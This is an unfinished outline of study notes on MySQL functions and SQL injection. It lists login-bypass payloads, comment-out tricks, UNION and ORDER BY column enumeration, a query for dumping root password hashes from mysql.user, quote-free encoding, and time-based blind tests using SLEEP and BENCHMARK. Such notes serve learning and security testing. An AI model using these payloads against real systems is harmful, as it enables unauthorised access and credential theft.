- Concept
    - SQL Injection
        - SQL Injection attack consists of insertion or injection of
        a SQL query via the input data form the client application.
        - this exploit can read sensitive data from the database, modify
        database data, execute administration operations.
        - occurs when the application fails to properly sanitize user-supplied
        input used in SQL queries.
    - Batched queries
        - is the ability to pass multiple SQL statments to the database
            Ex: SELECT col FROM table1 WHERE id=1; DROP table2;
    - Default databases
        - mysql : Requires root privilege
        - information_schema : Available from version 5 and higher
    - SQL statments
        - Case 
            CASE 
                WHEN condition1 THEN result1
                WHEN condition2 THEN result2
                WHEN conditionN THEN resultN
                ELSE result
            END

            Example
                SELECT OrderID, Quantity,
                CASE
                    WHEN Quantity > 30 THEN "The quantity is greater than 30"
                    WHEN Quantity = 30 THEN "The quantity is 30"
                    ELSE "The quantity is under 30"
                END AS QuantityText
                FROM OrderDetails;
    - SQL Functions
        - CONCAT : Add several strings together 
            Examples
                SELECT CONCAT("SQL ", "Tutorial ", "is ", "fun!") AS 
                ConcatenatedString;
        - CONCAT_WS() :  Add several expressions together and add the
        specified separator between them
            Examples
                SELECT CONCAT_WS("-", "SQL", "Tutorial", "is", "fun!") AS 
                ConcatenatedString;

                SELECT CONCAT_WS(" ", Address, Post, City) AS Address
                FROM Customers;
        - VERSION() : Returns the current version of the MySQL database
            Examples
                SELECT VERSION()
        - @@hostname : returns the server hostname
            Examples
                SELECT @@hostname;
        - UUID() : this is the universally unique identifier
            - Its 128-bit number
            - Last 12 digits are formed from the interfaces 
            MAC Address.

            Output
                aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeeee
        - GROUP_CONCAT() : used to concatenate data from multiple rows into one field.

            Examples
                SELECT emp_id, fname, lname, dept_id, 
                GROUP_CONCAT ( strength ) as "strengths" 
                FROM employee group by emp_id;
        - CHAR() - Returns the character based on the number code on ASCII
            Example
                SELECT CHAR(65) AS CodeToCharacter;

        - IF() - If else statment for SQL
            Syntax : IF(condition, value_if_true, value_if_false)
            Example
                SELECT IF(500<1000, "YES", "NO");
        - STRCMP() : Compares two strings
            Syntax : STRCMP(first_string, second_string)
            Example
                SELECT STRCMP("SQL", "HTML")
                    - equal : 0
                    - less than : -1
                    - greater than : 1
        - SLEEP(duration): pauses for the number of seconds given by 
        the duration argument, then return 0
            - returns one if interupted

            Example
                SELECT SLEEP(1000);
        - BENCHMARK(loop_count,expr) : esecutes the expression repeatedly
        loop_count times
            Example
                SELECT BENCHMARK(1000000,AES_ENCRYPT('hello','goodbye'));
        - MID(column_name, start[, length]) : function is used to extract
        characters from text field.
            Example
                SELECT MID(column_name,start[,length]) FROM table_name
- SQL Injection
    - Testing Injection
        - False means query is invalid
        - True means query is valid
        - String
            - Given : SELECT * FROM Table WHERE id = '1';
                '       False
                ''      True
                "       False
                ""      True
                \       False
                \\      True

                Examples
                SELECT * FROM Artilces WHERE id = '1''';
                SELECT 1 FROM dual WHERE 1 = '1'''''''''UNION SELECT '2'
            - You can use as many as apostrophes and quotations as You
            want as long as they pair up.
            - It is also possible to continue the statment after the 
            chain of quotes.
            - Quotes escape quotes
        - Numeric
            - Given : SELECT * FROM Table WHERE id = 1;
                AND 1       True
                AND 0       False
                AND true    True
                AND false   False
                1-false     Returns 1 if vulnerable
                1-true      Returns 0 if vulnerable
                1*56        Returns 56 if vulnerable
                1*56        Returns 1 if not vulnerable

                Examples
                SELECT * FROM User WHERE id=3-2;
        - In a Login
            - Given : SELECT * FROM User WHERE username = '';

                ' OR '1
                ' OR 1 -- -
                " OR ""="
                " OR 1 = 1 -- -
                '='
                'LIKE'
                '=0--+

                Examples
                    SELECT * 
                    FROM User 
                    WHERE username = 'Mike' AND password = '' OR ''='';
        

    - Comment Out query
        # : Single line
        /* : multiple line
        -- - : Single line
        ` : Backtick
        ;%00 : Nullbytes

        Examples 
            SELECT * FROM Users 
            WHERE username = '' OR 1=1 -- -' AND password = ''
        
            SELECT * FROM Users 
            WHERE id = '' UNION SELECT 1,2,3`';

        - Backtick can only be used to end a query when used as an alias
    
    
    - Database Credentials
        Table : mysql.user
        Columns : user, password
        Current User : user(), current_user(), current_user
            session_user(), system_user()

        SELECT current_user;

        SELECT CONCAT_WS(0x3A, user, password) FROM mysql.user
        WHERE user = 'root'-- (Privileged)
    
    - Tables and Columns
        - Order / Group By
            GROUP/ORDER BY n+1;

            - Keep on incrementing the number until you get False responce
            - Even though GROUP BY and ORDER BY have a different 
            functionalities in the SQL, they both can be used in the exact
            same fashion to determine the number of columns in query

            1' ORDER BY 1--+        True
            1' ORDER BY 2--+        True
            1' ORDER BY 3--+        False - Query only using 3 columns
            -1' UNION SELECT 1,2,3--+ True
        - Error Based 
            GROUP/ORDER BY 1,2,3,4,5........

            - Similar to the above we can check the number of columns

            1' GROUP BY 1,2,3,4,5--+ Unkown column '4'
            1' ORDER BY 1,2,3,4,5--+ Unkown column '4'
        - Error Based 2
            SELECT ... INTO var1, var2, ...

            - Works if error showing is working
            - useful for finding the number of columns when the injection
            point is after a LIMIT clause.

            Examples

            SELECT permission FROM Users WHERE id = {Injection Point}

            -1 UNNION SELECT 1 INTO @, @) 
                used SELECT have different number of columns
            -1 UNNION SELECT 1 INTO @)
                no error means query uses 1 column

        - Error Based 3
            AND (SELECT * FROM SOME_EXISTING_TABLE) = 1
                Notes:

                This works if you know the table name you're after 
                and error showing is enabled.
                It will return the amount of columns in the table, 
                not the query.

                Example:
                Given the query 
                    SELECT permission 
                    FROM Users WHERE id = {INJECTION POINT};

                    1 AND (SELECT * FROM Users) = 1	
                        Operand should contain 3 column(s)

        <<<< TO BE COMPLETED >>>
    - Avoiding the use of quotations
        SELECT * FROM Users WHERE username=0x61646D696E
            - Hex encoding
        SELECT * FROM Users WHERE username=CHAR(97, 100, 109, 105, 110)
    - Conditional statments
        CASE
        IF()
        IFNULL()
        NULLIF()
    - Timing 
        - Identify if a parameter is vulnerable to SQL injection
            - using SLEEP() 
                SELECT * FROM products WHERE id=1-SLEEP(15)
            - using BENCHMARK(100000000, rand())
                SELECT * FROM products WHERE id=1-BENCHMARK(100000000, rand())
        - Idetify if the SQL version is 5 or not
            SELECT * 
            FROM products 
            WHERE id=1-IF(MID(VERSION(),1,1) = '5', SLEEP(15), 0)

            
        









